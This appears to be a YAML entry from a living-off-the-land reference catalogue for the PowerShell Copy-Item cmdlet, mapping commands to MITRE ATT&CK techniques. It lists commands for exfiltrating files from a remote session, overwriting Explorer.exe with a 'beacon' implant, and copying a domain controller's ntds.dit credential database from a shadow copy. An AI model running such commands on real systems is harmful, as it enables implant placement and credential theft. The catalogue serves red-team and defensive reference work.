---
Name: Copy-Item
Description: Copies an item from one location to another
Updated: 2023-08-25
Toolsets:
  - Builtin
  - PSSession
Commands:
  - Command: 'Copy-Item -Path C:\boot.ini -Destination . -FromSession $ps'
    Description: Copy file from PSSession
    Usecases:
      - Exfiltrate data
    Function: Data
    Comments:
      - 'Create PSSession `$ps` using [New-PSSession](../New-PSSession/)'
      - 'PowerShell Module: `Microsoft.PowerShell.Management`'
    MitreAttack:
      - T1021.006
  - Command: 'Copy-Item -Path C:\beacon.exe -Destination C:\Windows\System32\Explorer.exe -ToSession $ps'
    Description: Copy file to PSSession
    Usecases:
      - Copy implant
    Function: Data
    Comments:
      - 'Create PSSession `$ps` using [New-PSSession](../New-PSSession/)'
      - 'PowerShell Module: `Microsoft.PowerShell.Management`'
    MitreAttack:
      - T1021.006
      - T1570
  - Command: 'Copy-Item -Path \\DC01.ad.bitsadmin.com\C$\@GMT-2023.06.01-19.34.01\Windows\NTDS\ntds.dit -Destination C:\Tmp\'
    Description: Copy from volume shadow copy
    Usecases:
      - 'Exfiltrate `ntds.dit` from shadow copy over SMB'
    Function: Data
    Comments:
      - 'Create PSSession `$ps` using [New-PSSession](../New-PSSession/)'
      - Example of performing such copy at the blog in the references
      - 'PowerShell Module: `Microsoft.PowerShell.Management`'
    MitreAttack:
      - T1570
      - T1021.002
Resources:
  - https://blog.bitsadmin.com/extracting-credentials-from-remote-windows-system
Detections:
Contributors:
    - Name: Arris Huijgen
      Handle: bitsadmin
---
